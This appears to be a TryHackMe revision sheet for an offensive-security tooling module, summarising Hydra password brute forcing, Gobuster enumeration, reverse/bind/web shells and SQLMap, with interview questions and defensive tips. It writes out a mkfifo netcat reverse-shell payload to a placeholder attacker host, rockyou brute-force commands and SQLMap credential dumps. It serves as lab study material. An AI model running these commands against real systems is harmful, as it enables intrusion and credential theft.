| Field | Detail |
|------|--------|
| **Platform** | TryHackMe |
| **Category** | Offensive Security Tooling / Bonus Revision |
| **Difficulty** | Beginner |
| **Time** | ~15 Minutes |
| **Module** | Offensive Security Tooling |

---

## Objective

This Mystery Chest is a **bonus revision vault** for the entire Offensive Security Tooling module. It consolidates the most important reference material from every room — Hydra, Gobuster: The Basics, Shells Overview, and SQLMap: The Basics — into one quick-reference place.

Use it as a lookup before a lab, an exam, or an interview. Everything here was covered across the module: brute-forcing credentials with **Hydra**, enumerating hidden content with **Gobuster**, turning a foothold into command execution with **shells**, and automating SQL injection with **SQLMap**. The common thread is the offensive workflow — **enumerate → attack → get access → validate impact** — always inside authorised scope.

> **Warning:** Every tool and technique below is for use only on systems you own or have **explicit written authorisation** to test, or inside a CTF/lab. Brute-forcing, enumeration, shells, and SQL injection against systems you do not control can violate laws and organisational policy.

---

## Hydra — Password Brute Force

**Hydra** is a fast online password-cracking tool that tries username/password combinations against a live network service until one works. The basic formula is `hydra -l/-L <user> -p/-P <pass> <target> <service>`.

| Option | Meaning |
|--------|---------|
| **`-l`** | Single username |
| **`-L`** | Username wordlist |
| **`-p`** | Single password |
| **`-P`** | Password wordlist |
| **`-t`** | Number of parallel threads |
| **`-s`** | Custom port |
| **`-V`** | Verbose (show every attempt) |
| **`-f`** | Stop after the first valid pair |

```bash
$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh
$ hydra -l molly -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10
$ hydra -l molly -P rockyou.txt 10.10.10.10 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

For web forms, `^USER^` and `^PASS^` are placeholders Hydra substitutes, and `F=` marks the failure string that tells Hydra a login attempt was rejected.

> **Security relevance:** Online brute force is loud and slow — it is defeated by strong passwords, account lockout, rate limiting, and MFA. Default credentials are the single easiest win, so change them everywhere.

---

## Gobuster — Content & DNS Enumeration

**Gobuster** is a Go-based enumeration tool that combines each wordlist entry with a target, sends a request, and analyses the response — discovering what a site does not advertise. Its three core modes each answer a different question.

| Mode | Purpose | Key flags | Question |
|------|---------|-----------|----------|
| **`dir`** | Directories / files | `-u`, `-w`, `-x`, `-r`, `-k` | "What paths/files exist?" |
| **`dns`** | DNS subdomains | `-d`, `-w`, `-i`, `-c` | "What subdomains resolve?" |
| **`vhost`** | Virtual hosts | `-u`, `--domain`, `--append-domain`, `--exclude-length` | "What site answers for this Host header?" |

```bash
$ gobuster dir -u http://example.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js
$ gobuster dns -d example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
$ gobuster vhost -u http://10.10.10.10 --domain example.thm -w wordlist.txt --append-domain
```

Gobuster `dir` mode is **not recursive** — re-scan interesting directories manually. A `403` can mean a resource exists but is protected, while a `200` can be a generic false positive.

> **Security relevance:** Enumeration maps the attack surface but exploits nothing. `DNS` asks "does this name resolve?" while `VHost` asks "what website answers for this Host header?" — always validate discoveries manually.

---

## Shells — From Foothold to Command Execution

A **shell** interprets commands and talks to the OS. In offensive security it is the command-line access obtained on a compromised machine — a **foothold**, running with the privileges of whatever obtained it (often `www-data`, not root).

| Shell type | Who listens | Connection direction |
|-----------|-------------|----------------------|
| **Reverse shell** | Attacker | Target → Attacker (beats inbound firewalls) |
| **Bind shell** | Target | Attacker → Target (needs an open port on target) |
| **Web shell** | — (HTTP) | Command travels as an HTTP request/response |

The listener waits on the attacker; the payload runs on the target. A Netcat listener plus the classic pipe reverse-shell payload:

```bash
$ nc -lvnp 443
```

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT > /tmp/f
```

A raw shell is stabilised into a usable PTY:

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
$ stty raw -echo
$ export TERM=xterm-256color
```

> **Security relevance:** A shell is a milestone, not the goal — and stabilisation is about usability, not privilege. After getting one, enumerate: `id`, `uname -a`, `sudo -l`, `find / -perm -4000 -type f 2>/dev/null`. A finding is not the same as exploitability.

---

## SQLMap — Automated SQL Injection

**SQLMap** automates the detection and exploitation of **SQL injection**, the flaw that arises when a web app places user input into an SQL query without treating it as data. It fingerprints the DBMS, confirms the injectable parameter, and walks the database structure for you.

The enumeration hierarchy narrows broad discovery down to the data:

| Flag | Purpose |
|------|---------|
| **`-u`** | Target URL (quote it — URLs contain special characters) |
| **`--dbs`** | Enumerate databases |
| **`-D`** | Select a database |
| **`--tables`** | Enumerate tables |
| **`-T`** | Select a table |
| **`--columns`** | Enumerate columns |
| **`-C`** | Select specific columns |
| **`--dump`** | Extract records |
| **`-r`** | Load a raw HTTP request (POST/auth) |
| **`--cookie`** | Supply a session cookie |
| **`--level` / `--risk`** | Testing depth / payload riskiness |

```bash
$ sqlmap -u "http://TARGET/search/cat=1"
$ sqlmap -u "http://TARGET/search/cat=1" --dbs
$ sqlmap -u "http://TARGET/search/cat=1" -D users -T thomas --columns
$ sqlmap -u "http://TARGET/search/cat=1" -D users -T thomas -C username,password --dump
$ sqlmap -r request.txt --cookie="PHPSESSID=SESSION_VALUE"
```

The four injection techniques SQLMap tests for are **Boolean-based blind**, **Error-based**, **Time-based blind**, and **UNION-based**.

> **Security relevance:** SQL injection comes from concatenating input into queries; the definitive defence is the **parameterized (prepared) query**, which keeps user input as data and out of the query's logic. SQLMap automates the attack, but you still must find the right request and read the output.

---

## The Offensive Tooling Workflow

The four tools chain into a single engagement flow, each handling one stage:

```text
Enumerate (Gobuster) → Attack credentials (Hydra) / Attack the database (SQLMap)
→ Gain access (Shell) → Stabilise → Enumerate deeper → Escalate → Validate impact
```

A typical toolkit places them after service discovery: `Nmap → Gobuster (content/subdomains) → Hydra (login brute force) / SQLMap (injection) → shell → post-exploitation`.

> **Security relevance:** Offensive tools discover and attack, but the tester supplies the methodology and judgement. The recurring lesson across every room: work only in authorised scope, and remember that a finding is only meaningful once its impact is validated.

---

## Quick Revision

| Topic | Key fact |
|-------|----------|
| **Hydra** | Online password brute force: `-l/-L` user, `-p/-P` pass, service (`ssh`, `ftp`, `http-post-form`). |
| **Web form brute** | `^USER^`/`^PASS^` placeholders, `F=` failure string. |
| **Gobuster** | Wordlist → request → response → analyse; modes `dir`, `dns`, `vhost`; not recursive. |
| **Status codes** | `403` = exists but denied (interesting); `200` can be a generic false positive. |
| **Shell types** | Reverse (target connects out), bind (target listens), web (over HTTP). |
| **Listener/payload** | Listener waits on attacker (`nc -lvnp`); payload runs on target. |
| **Stabilise** | `python3 -c 'import pty; pty.spawn("/bin/bash")'` → `stty raw -echo` → `export TERM=xterm-256color`. |
| **SQLMap** | Enumeration chain `--dbs` → `-D` → `--tables` → `-T` → `--columns` → `-C` → `--dump`. |
| **SQLi defence** | Parameterized/prepared statements; treat input as data, not syntax. |

**Key idea:** Offensive security tooling is a pipeline — **enumerate** what exists, **attack** the weak point (credentials or queries), **get a shell**, then **stabilise, enumerate deeper, and validate impact** — all within authorised scope.

---

## 30-Second Revision

- **Hydra** brute-forces live login services: `-l/-L` for usernames, `-p/-P` for passwords, plus the service (`ssh`, `ftp`, `http-post-form` with `^USER^`/`^PASS^` and `F=`).
- **Gobuster** enumerates hidden content: `dir` (paths/files), `dns` (subdomains), `vhost` (Host-header sites); it is not recursive, and `403`/`200` need validation.
- A **shell** is a foothold with the privileges of whatever obtained it — **reverse** (target connects out, beats firewalls), **bind** (target listens), or **web** (over HTTP).
- Catch a reverse shell with `nc -lvnp`, deliver the `mkfifo` pipe payload, then stabilise with `python3 -c 'import pty; pty.spawn("/bin/bash")'` + `stty raw -echo`.
- **SQLMap** automates SQL injection: `-u` to test, then `--dbs` → `-D` → `--tables` → `-T` → `--columns` → `-C` → `--dump`; use `-r`/`--cookie` for POST/auth.
- SQLi has four techniques (Boolean-blind, Error-based, Time-blind, UNION); the fix is parameterized queries.
- The whole module chains into one workflow: **enumerate → attack → get access → validate impact**, always in authorised scope.

---

## Interview Questions

| Question | Answer |
|---|---|
| **Q1. What is Hydra used for, and what do `-l`/`-L` and `-p`/`-P` mean?** | Hydra is an online password brute-force tool. `-l` is a single username and `-L` a username wordlist; `-p` is a single password and `-P` a password wordlist. |
| **Q2. What are Gobuster's three main modes and what does each do?** | `dir` enumerates web directories/files, `dns` brute-forces DNS subdomains, and `vhost` discovers virtual hosts by sending different Host headers to the same server. |
| **Q3. What is the difference between a reverse shell and a bind shell?** | In a reverse shell the target connects back to the attacker's listener (useful when inbound is firewalled); in a bind shell the target opens a listening port and the attacker connects in. |
| **Q4. Why is shell stabilisation useful, and what does it not provide?** | Stabilisation upgrades a raw shell to a PTY for job control, tab completion and interactive programs; it does not grant privilege escalation, persistence, or encryption. |
| **Q5. What is SQLMap's enumeration hierarchy?** | `--dbs` (databases) → `-D` (select database) `--tables` → `-T` (select table) `--columns` → `-C` (select columns) `--dump` (extract records). |
| **Q6. What is the primary defence against SQL injection?** | Parameterized (prepared) statements that separate SQL code from user data, so input is always treated as data rather than query syntax. |

## Final Takeaway

The Mystery Chest is your one-page memory aid for the **Offensive Security Tooling module**. Skim it before any lab, exam, or interview: **Hydra** brute-forces live login services with username/password lists and web-form placeholders; **Gobuster** enumerates hidden **directories**, **subdomains**, and **virtual hosts** from wordlists; **shells** — **reverse**, **bind**, and **web** — turn a foothold into command execution that you then **stabilise** into a usable PTY; and **SQLMap** automates **SQL injection** to fingerprint the DBMS and walk the database from `--dbs` down to `--dump`. Across every room the workflow is the same — **enumerate, attack, gain access, and validate impact** — and the professional discipline is the same too: work only within **authorised scope**, prefer targeted actions over noisy ones, and remember that discovering something is never the same as proving its impact.
